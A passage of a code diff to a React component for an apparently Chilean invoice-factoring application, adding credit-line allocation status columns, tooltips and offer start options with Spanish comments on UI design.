+                          return { facturas: pend, nDeudores: new Set(pend.map((f) => f.deudor)).size };
+                        })();
                         const fmtM0 = (n) => "$" + Math.round(n).toLocaleString("es-CL") + "M";
                         const fmtDMY = (iso) => { const p = (iso || "").split("-"); return p.length === 3 ? `${p[2]}-${p[1]}-${p[0]}` : iso; };
                         const vencDefault = (f) => { const he = Math.abs(hashStr("em" + f.folio)) % 20 + 3; return new Date(Date.now() + ((f.venc != null ? f.venc : 30) - he) * 86400000).toLocaleDateString("es-CL"); };
                         // Lista de facturas en escala de grises · Folio · Tipo · Nota · Emisión · Vencim (con calendario) · Tasa · Monto · (retirar)
-                        const GC_D = "104px 74px 92px 138px 86px 22px";
-                        const GC_O = "72px 100px 92px 92px 60px 84px 96px";
+                        const GC_D = "88px 62px 132px 74px 186px 158px 22px";
+                        const GC_O = "72px 100px 92px 92px 60px 84px 128px 96px";
                         const headDoc = (
                           <div className="grid items-center gap-2 pb-1 t9 uppercase tracking-wide" style={{ gridTemplateColumns: GC_D, color: "#B4B2BC", borderBottom: `1px solid ${C.line}` }}>
-                            <span>Tipo doc.</span><span>Folio</span><span>F. emisión</span><span>F. vencim.</span><span className="text-right">Monto</span><span></span>
+                            <span>Tipo doc.</span><span>Folio</span><span>F. vencim.</span><span className="text-right">Monto</span><span>Financiada con</span><span>Estado</span><span></span>
                           </div>
                         );
                         const filaDoc = (f) => {
                           const tdn = ((f.tipo || "").match(/\((\d+)\)/) || [])[1] || "33";
                           const tdoc = tdn === "34" ? "Factura exenta 34" : tdn === "46" ? "Factura compra 46" : tdn === "61" ? "Nota créd. 61" : "Factura 33";
-                          const he = Math.abs(hashStr("em" + f.folio)) % 20 + 3; const em = new Date(Date.now() - he * 86400000).toLocaleDateString("es-CL");
                           const vencVal = vencFecha[f.id] || ""; const vencTxt = vencVal ? fmtDMY(vencVal) : vencDefault(f);
                           const GRAY = "#9E9CA6";
+                          // Resultado de la asignación para ESTA factura. «Financiada con» muestra la línea de
+                          // origen; una factura repartida entre dos líneas de la cascada muestra ambas. El motivo
+                          // del rechazo se explica en lenguaje de negocio, nunca con el nombre técnico del nivel.
+                          const ef = evalFac[f.id];
                           return (
                             <div key={f.id} className="grid items-center gap-2 py-1 t10" style={{ gridTemplateColumns: GC_D, borderBottom: "1px solid #F0EFF3", color: GRAY }}>
                               <span className="truncate t9" title={tdoc}>{tdoc}</span>
                               <span style={{ fontVariantNumeric: "tabular-nums" }}>#{f.folio}</span>
-                              <span className="t9">{em}</span>
                               <span className="relative inline-flex items-center gap-1.5 t9">
                                 <span>{vencTxt}</span>
                                 {!bloqueado && (<>
@@ -5410,13 +6299,23 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                                 </>)}
                               </span>
                               <span className="text-right">{fmtMM(f.montoMM)}</span>
+                              <span className="flex flex-wrap items-center gap-1">
+                                {ef && ef.origen.length ? ef.origen.map((o) => (
+                                  <span key={o.lineaId} className="inline-flex items-center whitespace-nowrap rounded px-1 t7 font-semibold" style={{ backgroundColor: "#F5F4F8", color: "#6B7280", border: `1px solid ${C.line}` }} title={`${o.tipo} · ${o.lineaId}`}>{o.lineaId} · {fmtMM(o.monto)}</span>
+                                )) : <span className="t9">—</span>}
+                              </span>
+                              <span className="min-w-0">
+                                {!ef ? <span className="t9">Sin evaluar</span>
+                                  : ef.estado === "CON_LINEA" ? <span className="t9 font-semibold" style={{ color: "#16A34A" }}>Se puede cursar</span>
+                                  : <><span className="block t9 font-semibold" style={{ color: "#EF4444" }}>Requiere comité</span><span className="block truncate t7" style={{ color: C.faint }} title={ef.motivoTexto}>{ef.motivoTexto}</span></>}
+                              </span>
                               {!bloqueado ? <button onClick={() => setConfirmRetiro(f)} disabled={validas.length <= 1} title={validas.length <= 1 ? "La oferta debe tener al menos una factura" : "Retirar de la oferta"} className="justify-self-center rounded p-0.5 disabled:opacity-30" style={{ color: "#B4B2BC" }}><Trash2 size={12} /></button> : <span></span>}
                             </div>
                           );
                         };
                         const headOtra = (
                           <div className="grid items-center gap-2 pb-1 t9 uppercase tracking-wide" style={{ gridTemplateColumns: GC_O, color: C.faint, borderBottom: `1px solid ${C.line}` }}>
-                            <span>Folio</span><span>Tipo doc.</span><span>F. emisión</span><span>F. vencim.</span><span className="text-right">Tasa</span><span className="text-right">Monto</span><span>Acción</span>
+                            <span>Folio</span><span>Tipo doc.</span><span>F. emisión</span><span>F. vencim.</span><span className="text-right">Tasa</span><span className="text-right">Monto</span><span>Estado</span><span>Acción</span>
                           </div>
                         );
                         const filaOtraD = (f) => {
@@ -5435,67 +6334,643 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                               <span className="t9" style={{ color: C.faint }}>{venc}</span>
                               <span className="text-right font-medium" style={{ color: C.ink }}>{tasaF}%</span>
                               <span className="text-right font-medium" title={parcial ? `Factura ${fmtMM(f.montoMM)} − NC ${fmtMM(est.ncMonto)} = ${fmtMM(est.montoNeto)}` : undefined} style={{ color: parcial ? "#C2410C" : C.ink }}>{fmtMM(parcial ? est.montoNeto : f.montoMM)}</span>
+                              {/* ¿Entra en la línea si la agrego? Se compara su monto contra la holgura que le
+                                  queda HOY al deudor: es la pregunta que uno se hace mirando la fila, y no
+                                  depende de qué otras facturas se agreguen junto con ella. */}
+                              {(() => {
+                                const ldF = lineaDeudor[f.deudor];
+                                const m = parcial ? est.montoNeto : (f.montoMM || 0);
+                                if (bloq) return <span className="truncate t9 font-semibold" style={{ color: "#EF4444" }} title={`${est.label} · no se puede agregar`}>{est.label}</span>;
+                                if (!ldF || ldF.neta == null) return <span className="t9" style={{ color: C.faint }}>Por evaluar</span>;
+                                const cabe = m <= ldF.neta;
+                                return <span className="truncate t9 font-semibold" style={{ color: cabe ? "#16A34A" : "#7C3AED" }}
+                                  title={cabe ? `Cabe en la línea que le queda al deudor (${fmtMM(ldF.neta)}).` : `Excede en ${fmtMM(+(m - ldF.neta).toFixed(1))} la línea que le queda al deudor (${fmtMM(ldF.neta)}): agregarla manda esa parte a comité.`}>
+                                  {cabe ? "Se puede cursar" : "Requiere comité"}</span>;
+                              })()}
                               <button onClick={agregar} disabled={bloqueado || bloq} title={bloq ? `${est.label} · no se puede agregar` : parcial ? `Se agregará por el monto neto (${fmtMM(est.montoNeto)})` : "Agregar a la simulación"} className="justify-self-start flex shrink-0 items-center gap-0.5 rounded-full px-1.5 py-0.5 t9 font-semibold disabled:opacity-40 disabled:cursor-not-allowed" style={{ border: "1px solid #F97316", color: "#C2410C", backgroundColor: "#fff" }}><Plus size={10} /> Agregar</button>
                             </div>
                           );
                         };
-                        const cabDeudor = (deudor, grupo, abierto) => {
+                        // Tonos de cobertura y de estado. El caso PARCIAL va en VIOLETA, no en naranjo: no es una
+                        // advertencia, es el caso normal de una oferta grande. Los fondos claros llevan borde del
+                        // mismo tono; sin él, el verde #F0FDF4 es imperceptible sobre blanco.
+                        const TONO_LIN = {
+                          con_linea: { fg: "#16A34A", bg: "#F0FDF4", bd: "#bbf7d0", lbl: "Con línea" },
+                          parcial:   { fg: "#7C3AED", bg: C.lilac,   bd: "#DDD3FF", lbl: "Parcial" },
+                          // «Sin línea» competía con el chip de línea de la izquierda —que sí habla de si
+                          // el deudor TIENE línea— y en la misma fila se leían como una contradicción. Este
+                          // dice qué le pasa a la selección, que es otra cosa: se va a comité.
+                          sin_linea: { fg: "#EF4444", bg: "#FEF2F2", bd: "#fecaca", lbl: "Requiere comité" },
+                          pend:      { fg: "#6B7280", bg: "#F3F4F6", bd: C.line,    lbl: "Sin evaluar" },
+                        };
+                        const cabDeudor = (deudor, grupo, abierto, enOferta) => {
                           const rep = grupo[0]; const td = tipoDeudorDisp(rep); const prime = td === "Lista Blanca" || td === "Deudor Autorizado";
                           const nota = notaFromScore(scoreDeudor(deudor, td).score);
                           const verifOk = grupo.every((f) => verifFactura(f, deal).est === "ok");
                           const og = deudorOtorgMap[deudor] || { ok: 0, total: 0 }; const allOk = og.total > 0 && og.ok === og.total;
                           const monto = +grupo.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1);
                           const tasa = tasaDe(deudor);
-                          const L = lineaDeudor(deudor); const proy = L.uso + Math.round(monto); const fuera = proy > L.aprobada; const base = Math.max(proy, L.aprobada) || 1;
+                          const ev = enOferta ? evalDeu[deudor] : null;
+                          const t = TONO_LIN[ev ? ev.estado : "pend"];
+                          // Detalle de línea: vive DENTRO del chip de estado, no como un botón separado. Es el
+                          // único lugar de la pantalla donde aparece el vocabulario de líneas, y bajo demanda.
+                          // El nivel del par se despliega en sus líneas reales; los otros dos van tal cual.
+                          // Y las líneas usadas se nombran, no se listan por id: «LF2-76190780-1» no le
+                          // dice nada a nadie fuera de este archivo.
+                          // Dos naturalezas distintas: de las líneas del par se ASIGNA el monto, y las dos
+                          // globales sólo LIMITAN —no financian a nadie, acotan a todos—. Van separadas
+                          // porque el ejecutivo necesita saber cuál pedir, y no se pide lo mismo.
+                          // Cuando el acordeón fusiona dos RUT bajo la misma razón social, las líneas de
+                          // ambos conviven en el desglose y sin el RUT se lee como que UN deudor se financia
+                          // con su línea propia y con la de otros deudores a la vez, que el modelo prohíbe.
+                          // Sin `filter(Boolean)`: las facturas del libro del cliente pueden venir sin RUT del
+                          // receptor y forman un grupo aparte con el MISMO nombre. Descartarlas del recuento
+                          // dejaba el desglose fusionado sin identificar, que es justo el caso confuso.
+                          const mixRut = !!(ev && new Set((ev.detallePar || []).map((x) => x.rut || "")).size > 1);
+                          const rutsConPropia = new Set(((ev && ev.detallePar) || []).filter((x) => x.tipo === "LF2" || x.tipo === "LF3").map((x) => x.rut || ""));
+                          const noAplicaLF4 = (d) => d.tipo === "LF4" && rutsConPropia.has(d.rut || "");
+                          const itemsTip = ev ? [
+                            // Marcar «← manda» en cada línea del par sería falso: lo que manda es el NIVEL,
+                            // y su capacidad es la suma. La nota de arriba ya lo dice por su nombre.
+                            { head: ev.manda.nivel === "par" ? "Asignado a este deudor · manda" : "Asignado a este deudor" },
+                            // Un deudor con línea propia NO puede financiarse con la de Otros Deudores. En el
+                            // acordeón conviven porque una misma razón social puede llegar con dos RUT, así que
+                            // la que no aplica se atenúa y se dice por qué, en vez de listarla como una opción.
+                            ...(ev.detallePar || []).slice().sort((a, b) => (noAplicaLF4(a) ? 1 : 0) - (noAplicaLF4(b) ? 1 : 0)).map((d) => {
+                              const noAplica = noAplicaLF4(d);
+                              // El monto de la derecha es el SALDO, no la capacidad: sin decir cuánto lleva
+                              // consumido esta oferta se lee como el techo de lo asignable y no cuadra con el
+                              // monto asignado del deudor.
+                              // La cifra grande es lo ASIGNADO de esa línea en esta oferta; de cuánto se partía
+                              // y cuánto queda van en la explicación. Con el saldo en negrita había que
+                              // reconstruir el punto de partida sumando de cabeza.
+                              const propio = d.usadoDeudor != null ? d.usadoDeudor : d.usado;
+                              const otros = +Math.max(0, d.usado - propio).toFixed(1);
+                              const partes = [];
+                              if (noAplica) partes.push("no aplica: tiene línea propia");
+                              else {
+                                if (mixRut) partes.push(d.rut || "sin RUT");
+                                partes.push(`de ${fmtMM(+(d.usado + d.disponible).toFixed(1))} disponibles`);
+                                // La línea compartida se explica: sin decir cuánto se llevaron los otros
+                                // deudores, el saldo no cuadra con lo asignado a éste.
+                                if (otros > 0) partes.push(`${fmtMM(otros)} de otros deudores`);
+                                partes.push(`queda ${fmtMM(d.disponible)}`);
+                              }
+                              return { name: d.label, dim: noAplica, val: fmtMM(noAplica ? 0 : propio), sub: partes.join(" · ") };
+                            }),
+                            { head: "Límites globales · saldo" },
+                            ...ev.topes.filter((tp) => tp.nivel !== "par").map((tp) => ({ name: tp.label, val: fmtMM(tp.disponible),
+                              sub: [tp.sub || "", tp.nivel === ev.manda.nivel ? "← manda" : ""].filter(Boolean).join(" · ") })),
+                          ] : [];
+                          const chipEstado = (
+                            <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: t.bg, color: t.fg, border: `1px solid ${t.bd}` }}>
+                              {t.lbl}{ev && <span style={{ opacity: .75, fontWeight: 700 }}>ⓘ</span>}
+                            </span>
+                          );
                           return (
                             <div className="flex items-center gap-3 px-3.5 py-2.5">
                               <span style={{ color: C.faint, flex: "none", display: "inline-flex" }}>{abierto ? <ChevronUp size={15} /> : <ChevronDown size={15} />}</span>
                               {/* Identidad: razón social (con ellipsis) y, debajo, RUT · Nota (badge neutro) · Prime */}
-                              <div style={{ flex: 1, minWidth: 0 }}>
-                                <div className="truncate t11 font-semibold" style={{ color: C.ink, maxWidth: 220 }} title={deudor}>{deudor}</div>
-                                <div className="mt-0.5 flex items-center gap-2">
-                                  <span className="t9" style={{ color: C.faint, fontVariantNumeric: "tabular-nums" }}>{rutDe(deudor)}</span>
+                              <div style={{ flex: "1 1 auto", minWidth: 0 }}>
+                                <div className="truncate t11 font-semibold" style={{ color: C.ink }} title={deudor}>{deudor}</div>
+                                <div className="mt-0.5 flex flex-wrap items-center gap-2">
+                                  <span className="t9 whitespace-nowrap" style={{ color: C.faint, fontVariantNumeric: "tabular-nums" }}>{rutDe(deudor)}</span>
                                   <span className="inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: "#ECEBEF", color: "#374151" }} title={`Nota del deudor: ${nota} / 5`}><span style={{ width: 6, height: 6, borderRadius: 9999, backgroundColor: "#8A63FF" }} />Nota {nota}</span>
-                                  {prime && <span className="rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: C.lilac, color: C.indigo }}>★ Prime</span>}
+                                  {prime && (() => {
+                                    const ld = lineaDeudor[deudor];
+                                    const m = ld && ld.montoFuera > 0 ? ld.montoFuera : 0;
+                                    return (
+                                      <span className="whitespace-nowrap rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: C.lilac, color: C.indigo, cursor: m > 0 ? "help" : undefined }}
+                                        title={m > 0 ? `Deudor Prime (Lista Blanca o Autorizado) con ${ld.nFuera} factura(s) disponibles por ${fmtMM(m)} fuera de la oferta.` : "Deudor Prime (Lista Blanca o Autorizado). No tiene facturas disponibles fuera de la oferta."}>
+                                        ★ Prime{m > 0 ? ` ${fmtMM(m)}` : ""}
+                                      </span>
+                                    );
+                                  })()}
+                                  {/* Cuánta línea le queda y cuánto de lo disponible cabría en ella. Estaba
+                                      sólo en el tooltip del chip de estado y sólo para los que ya estaban en
+                                      la oferta; acá abajo es justamente donde se decide a quién sumar. */}
+                                  {(() => {
+                                    const ld = lineaDeudor[deudor];
+                                    if (!ld) return null;
+                                    const hay = ld.disponible > 0;
+                                    // Sin cupo hay DOS situaciones, y la medida que las resuelve es distinta:
+                                    // con línea propia agotada se AMPLÍA; sin línea propia hay que CREARLA. Decir
+                                    // «Línea disponible $0M» en ambos casos las volvía indistinguibles, y encima
+                                    // convivía en la misma fila con el chip de estado, que decía «Sin línea».
+                                    const lbl = hay ? `Línea disponible ${fmtMM(ld.disponible)}` : ld.conLineaPropia ? "Línea Cliente - Deudor sin cupo" : "Sin Línea Cliente - Deudor";
+                                    const tip = (hay
+                                      ? `Línea disponible de este deudor: ${fmtMM(ld.disponible)} — el menor entre la Línea Cliente - Deudor, la Línea Global Cliente y la Línea Global Deudor. No descuenta las facturas ya seleccionadas en esta oferta: la línea se consume al cursar.`
+                                      : ld.conLineaPropia
+                                        ? `Tiene Línea Cliente - Deudor pero sin cupo${ld.manda ? ` (manda: ${ld.manda})` : ""}: sus facturas van a comité, y lo que se pide es AMPLIARLA.`
+                                        : "No tiene Línea Cliente - Deudor: sus facturas van a comité, y lo que se pide es SOLICITAR una puntual Cliente - Deudor.")
+                                      + (ld.nFuera > 0 ? ` Tiene ${ld.nFuera} factura(s) fuera de la oferta por ${fmtMM(ld.montoFuera)}.` : "");
+                                    return (
+                                      <span className="inline-flex items-center gap-1 whitespace-nowrap rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: hay ? "#F0FDF4" : "#F3F4F6", color: hay ? "#16A34A" : "#6B7280", cursor: "help" }} title={tip}>
+                                        <span style={{ width: 6, height: 6, borderRadius: 9999, backgroundColor: hay ? "#16A34A" : "#9CA3AF" }} />
+                                        {lbl}
+                                      </span>
+                                    );
+                                  })()}
                                 </div>
                               </div>
-                              {/* Línea del deudor: indicador gráfico (proyección post-curse vs. aprobada) */}
-                              <div style={{ width: 200, flex: "none" }}>
-                                <div className="t9" style={{ color: C.sub }}>Línea <b style={{ color: fuera ? "#DC2626" : C.ink }}>{fmtM0(proy)}</b> <span style={{ color: C.faint }}>/ {fmtM0(L.aprobada)}</span></div>
-                                <div className="relative mt-1 h-1.5 w-full rounded-full" style={{ backgroundColor: "#E4E3E9" }}>
-                                  <div className="absolute left-0 top-0 h-1.5 rounded-l-full" style={{ width: Math.min(100, L.uso / base * 100) + "%", backgroundColor: "#9CA3AF" }} />
-                                  <div className="absolute top-0 h-1.5" style={{ left: (L.uso / base * 100) + "%", width: (Math.round(monto) / base * 100) + "%", backgroundColor: fuera ? "#DC2626" : "#8A63FF" }} />
-                                  <span style={{ position: "absolute", left: (L.aprobada / base * 100) + "%", top: -2, width: 2, height: 9.5, backgroundColor: C.ink }} />
+                              {/* El contador «N de M con línea» salió de acá: el chip de la derecha
+                                  —Con línea / Parcial / Sin línea, con su desglose en el tooltip— ya
+                                  responde lo mismo, y a media fila de distancia se leían como dos datos. */}
+                              {/* Derecha: monto asignado / seleccionado, chip de estado con su detalle, y las otras dos compuertas */}
+                              <div style={{ flex: "none", textAlign: "right" }}>
+                                {/* «$0M de $77,5M» no se entendia: el numero grande es lo que tiene LINEA y el
+                                    chico lo SELECCIONADO, y sin decirlo parecia que el deudor no aportaba nada a
+                                    una oferta en la que sí está —el total de la seccion lo cuenta completo—. Se
+                                    nombra el primero. Cuando coinciden se muestra uno solo: repetir la cifra con
+                                    el chip «Con línea» al lado es ruido. */}
+                                <div className="t11 font-semibold" style={{ color: C.ink }}
+                                  title={enOferta && ev ? `${fmtMM(monto)} seleccionados de este deudor; ${fmtMM(ev.asignado)} tienen línea disponible y el resto necesita comité.` : undefined}>
+                                  {enOferta && ev && ev.asignado !== monto
+                                    ? <>{fmtMM(ev.asignado)}<span className="t9 font-normal" style={{ color: C.faint }}> con línea, de {fmtMM(monto)}</span></>
+                                    : fmtMM(monto)}
+                                  <span className="t9 font-normal" style={{ color: C.faint, marginLeft: 10 }}>{grupo.length} fact. · tasa {tasa}%</span>
                                 </div>
-                                <div className="mt-0.5 t7 font-semibold" style={{ color: fuera ? "#DC2626" : "#9CA3AF" }}>{fuera ? `Fuera de línea +${fmtM0(proy - L.aprobada)}` : "Dentro de línea"}</div>
-                              </div>
-                              {/* Derecha: monto + tasa (consolidada del deudor) + tags de otorgamiento y verificación */}
-                              <div style={{ flex: 1, textAlign: "right" }}>
-                                <div className="t11 font-semibold" style={{ color: C.ink }}>{fmtMM(monto)}<span className="t9 font-normal" style={{ color: C.faint, marginLeft: 10 }}>{grupo.length} fact. · tasa {tasa}%</span></div>
                                 <div className="mt-1 flex items-center justify-end gap-1.5">
-                                  {og.total > 0 && <span className="inline-flex items-center gap-1 rounded-full py-0.5 t9 font-semibold" style={{ paddingLeft: 8, paddingRight: 3, backgroundColor: C.lilac, color: C.indigo }} title={`${og.ok} de ${og.total} reglas de otorgamiento del deudor cumplieron`}>{!allOk && <AlertTriangle size={10} />}Otorg.<span className="rounded-full px-1.5 t7 font-semibold" style={{ backgroundColor: C.indigo, color: "#fff", fontVariantNumeric: "tabular-nums", paddingTop: 1, paddingBottom: 1 }}>{og.ok}/{og.total}</span></span>}
-                                  <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: verifOk ? "#F0FDF4" : "#FEF2F2", color: verifOk ? "#16A34A" : "#DC2626" }} title={verifOk ? "Deudor verificado" : "El deudor requiere verificación"}><span style={{ width: 7, height: 7, borderRadius: 9999, backgroundColor: verifOk ? "#16A34A" : "#DC2626" }} />{verifOk ? "Verificado" : "Req. verif."}</span>
+                                  {/* Mismos colores que las compuertas del pie del veredicto: otorgamiento en
+                                      violeta y verificación en azul (pendiente) o verde (resuelta). Antes acá
+                                      otorgamiento iba en el púrpura de marca y verificación en rojo, y el mismo
+                                      dato se leía de dos colores distintos a dos centímetros de distancia. */}
+                                  {og.total > 0 && <span className="inline-flex items-center gap-1 rounded-full py-0.5 t9 font-semibold" style={{ paddingLeft: 8, paddingRight: 3, backgroundColor: allOk ? "#F0FDF4" : "#f5f3ff", color: allOk ? "#16A34A" : "#7C3AED" }} title={allOk ? `Las ${og.total} reglas de otorgamiento del deudor cumplen` : `${og.total - og.ok} de ${og.total} reglas de otorgamiento del deudor están pendientes`}>{allOk ? <Check size={10} /> : <AlertTriangle size={10} />}Otorg.<span className="rounded-full px-1.5 t7 font-semibold" style={{ backgroundColor: allOk ? "#16A34A" : "#7C3AED", color: "#fff", fontVariantNumeric: "tabular-nums", paddingTop: 1, paddingBottom: 1 }}>{og.total - og.ok}/{og.total}</span></span>}
+                                  <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: verifOk ? "#F0FDF4" : "#FEF2F2", color: verifOk ? "#16A34A" : "#EF4444" }} title={verifOk ? "Deudor verificado" : "El deudor requiere verificación"}>{verifOk ? <Check size={10} /> : <AlertTriangle size={10} />}{verifOk ? "Verificado" : "Req. verif."}</span>
+                                  {enOferta && (ev ? <TipDesglose titulo="Línea disponible para este deudor" color={t.fg} nota={`Manda ${ev.manda.label}: quedan ${fmtMM(ev.holgura)} para sumar más facturas.`} items={itemsTip}>{chipEstado}</TipDesglose> : chipEstado)}
                                 </div>
                               </div>
                             </div>
                           );
                         };
                         const totalOf = +validas.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1);
+                        // OPCIONES DE ARRANQUE: mientras no hay simulación, el ejecutivo elige qué incluir
+                        // en vez de que el sistema decida por él. Son los mismos tramos que ofrece «Ajustar
+                        // facturas», pero calculados sobre TODO el pool —lo que ya está en la oferta más lo
+                        // disponible—, porque la elección DEFINE la oferta completa, no suma a lo que haya.
+                        const opcionesInicio = (() => {
+                          if (deal.simulado) return [];
+                          const norm = (f) => { const e = estadoCandidata(f, deal); return e.clave === "notaParcial" ? { ...f, montoMM: e.montoNeto, _ncAplicada: e.ncMonto } : f; };
+                          const vistos = new Set(); const pool = [];
+                          validas.forEach((f) => { if (f && f.id != null && !vistos.has(f.id)) { vistos.add(f.id); pool.push(f); } });
+                          Object.keys(grpOt).forEach((dn) => (grpOt[dn] || []).forEach((f) => {
+                            if (!f || f.id == null || vistos.has(f.id) || !estadoCandidata(f, deal).agregable) return;
+                            vistos.add(f.id); pool.push(norm(f));
+                          }));
+                          const tramoDe = (f) => {
+                            const td = tipoDeudorDisp(f);
+                            if (td === "Lista Blanca" || td === "Deudor Autorizado") return "prime";
+                            return notaFromScore(scoreDeudor(f.deudor || "", td).score) > NOTA_PRIORITARIA ? "notaAlta" : "resto";
+                          };
+                          const deTramo = (t) => pool.filter((f) => tramoDe(f) === t);
+                          const prime = deTramo("prime"), notaAlta = deTramo("notaAlta"), resto = deTramo("resto");
+                          // Cuáles de las Prime caben: se evalúan SOLAS contra la línea, porque esta opción
+                          // arma la oferta desde cero y no se suma a nada.
+                          const conLinea = (() => {
+                            if (!prime.length || !deal.rutEmisor) return [];
+                            const ev = asignarLineas(prime, deal.rutEmisor);
+                            const st2 = new Map((ev.facturas || []).map((x) => [x.id, x.estado]));
+                            return prime.filter((f) => st2.get(f.id) === "CON_LINEA");
+                          })();
+                          const tot = (a) => +a.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1);
+                          return [
+                            // #F0FDF4 es correcto para una etiqueta chica sobre gris, pero sobre la tarjeta
+                            // BLANCA del selector desaparece y el chip parece no tener fondo. Mismo verde que
+                            // usa la tarjeta de veredicto cuando la oferta se aprueba entera.
+                            { k: "conlinea", lab: "Prime con línea", fs: conLinea, fg: "#16A34A", bg: "#DCFCE7", tip: "Sólo las facturas de deudores Prime que caben en la línea: no manda nada a comité." },
+                            { k: "prime", lab: "Todas las Prime", fs: prime, fg: C.indigo, bg: C.lilac, tip: "Todas las facturas de deudores Prime (Lista Blanca o Autorizados). Las que no quepan en la línea irán a comité." },
+                            { k: "notaAlta", lab: "Nota Deudor > 4,2", fs: notaAlta, fg: "#2563EB", bg: "#EFF6FF", tip: "Deudores no Prime con Nota sobre 4,2. Las que no quepan en la línea irán a comité." },
+                            { k: "todas", lab: "Todo lo disponible", fs: pool, fg: "#6B7280", bg: "#F3F4F6", tip: "Todas las facturas disponibles del cliente, sin filtrar por tramo." },
+                          ].filter((o2) => o2.fs.length > 0).map((o2) => ({ ...o2, monto: tot(o2.fs) }));
+                        })();
+                        // Elegir una opción DEFINE la oferta y simula en el mismo gesto: es lo que el
+                        // ejecutivo venía a conseguir, y separarlo en dos clics no agrega ninguna decisión.
+                        const elegirInicio = (fs, lab) => {
+                          if (simIni) return; // ya hay una simulación en vuelo
+                          // Misma latencia simulada que el recálculo del inbound: base + incremento por
+                          // documento, configurable por tenant. Anticipa ofertas de miles de facturas.
+                          const latencia = Math.min(6000, CFG_ACTIVA.latenciaBaseMs + fs.length * CFG_ACTIVA.latenciaPorDocMs);
+                          setSimIni({ lab, n: fs.length });
+                          logSys("info", "background", `Simulando la oferta de ${deal.id}: ${fs.length} factura(s) · latencia estimada ${latencia} ms`,
+                            { operacion: deal.id, opcion: lab, facturas: fs.length, latenciaMs: latencia });
+                          setTimeout(() => {
+                            if (onSugerirOferta) onSugerirOferta(deal.id, fs);
+                            if (onSimular) onSimular(deal.id);
+                            setReevalPend(false);
+                            setSimIni(null);
+                          }, latencia);
+                        };
                         return (
                           <>
-                            <div className="mt-2 flex items-center gap-1.5 rounded-full px-2.5 py-1.5" style={{ border: `1px solid ${C.line}`, backgroundColor: "#fff" }}>
-                              <Search size={12} style={{ color: C.faint }} />
-                              <input value={detQuery} onChange={(e) => { setDetQuery(e.target.value); setDetOtrasPage(0); }} placeholder="Buscar empresa deudora o folio…" className="w-full bg-transparent t11 outline-none" style={{ color: C.ink }} />
-                              {detQuery && <button onClick={() => { setDetQuery(""); setDetOtrasPage(0); }} style={{ color: C.faint }}><X size={12} /></button>}
+                            {/* Resumen y condiciones se atenúan JUNTOS mientras la selección esté sin
+                                re-evaluar: son la misma respuesta —qué se puede cursar y en qué
+                                condiciones— y quedaba media pantalla viva y media apagada. */}
+                            <div className="relative">
+                            {/* Se atenúa en DOS casos: mientras no se ha simulado —los números que se ven
+                                detrás son la referencia de lo que va a calcularse— y cuando la selección
+                                cambió y falta re-evaluar. En ambos la acción va al centro. */}
+                            <div style={(reevalPend || !deal.simulado) ? { opacity: 0.4, pointerEvents: "none" } : undefined}>
+                            {/* ── TARJETA DE VEREDICTO ────────────────────────────────────────────────────
+                                Responde la pregunta principal de la pantalla —qué parte se puede cursar hoy y
+                                qué parte necesita comité— y concentra la acción. El monto CURSABLE lo decide
+                                sólo la asignación de línea; otorgamiento y verificación no lo bajan, se
+                                muestran aparte porque deciden el momento del giro, no el monto. */}
+                            {(() => {
+                              const nComite = evalLin ? evalLin.facturas.filter((f) => f.estado === "REQUIERE_COMITE").length : 0;
+                              const vd = !validas.length ? { tono: "pend", tit: "La oferta está vacía", sub: "Elige qué facturas incluir para evaluar la línea." }
+                                : reevalPend ? { tono: "parcial", tit: "La selección cambió", sub: "El monto de la oferta ya está actualizado; falta re-evaluar la línea." }
+                                : evalLin.requiereComite === 0 ? { tono: "con_linea", tit: `Se puede cursar la oferta completa · ${fmtMM(evalLin.cursable)}`, sub: "Todas las facturas de la oferta tienen línea disponible." }
+                                : evalLin.cursable === 0 ? { tono: "sin_linea", tit: "No se puede cursar nada de esta oferta", sub: `Las ${nComite} facturas por ${fmtMM(evalLin.requiereComite)} necesitan aprobación del comité de riesgo.` }
+                                : { tono: "parcial", tit: `Se puede cursar ${fmtMM(evalLin.cursable)} de ${fmtMM(totalOf)}`, sub: `${nComite} factura(s) por ${fmtMM(evalLin.requiereComite)} no tienen línea disponible. Puedes enviarlas a comité o quitarlas y cursar el resto hoy.` };
+                              const t = TONO_LIN[vd.tono];
+                              // Cada compuerta se lee igual: rótulo, estado y «pendientes/total». En verde
+                              // cuando no queda nada por hacer, en su color de nivel cuando sí.
+                              const nSinLinea = deudOf.filter((dn) => evalDeu[dn] && evalDeu[dn].estado !== "con_linea").length;
+                              // Las tres compuertas se evalúan SOBRE LA OFERTA. Con la oferta vacía no hay
+                              // nada que aprobar: mostrar «criterios por aprobar» de una selección que no
+                              // existe hace leer que la operación ya trae observaciones. Guion hasta que
+                              // haya facturas seleccionadas.
+                              const compuerta = (lbl, ok, txtOk, txtPend, pend, total, fg, bg, tip) => (
+                                <span className="inline-flex items-center gap-2" title={validas.length ? tip : "Se evalúa sobre las facturas de la oferta: todavía no hay ninguna seleccionada."} style={{ cursor: "help" }}>
+                                  <span className="t9 uppercase tracking-wide" style={{ color: C.faint }}>{lbl}</span>
+                                  {!validas.length ? <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#F5F4F8", color: C.faint, border: `1px solid ${C.line}` }}>—</span> : (
+                                  <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: ok ? "#F0FDF4" : bg, color: ok ? "#16A34A" : fg, border: `1px solid ${ok ? "#bbf7d0" : fg + "40"}` }}>
+                                    {ok ? <Check size={10} /> : <AlertTriangle size={10} />}{ok ? txtOk : txtPend}
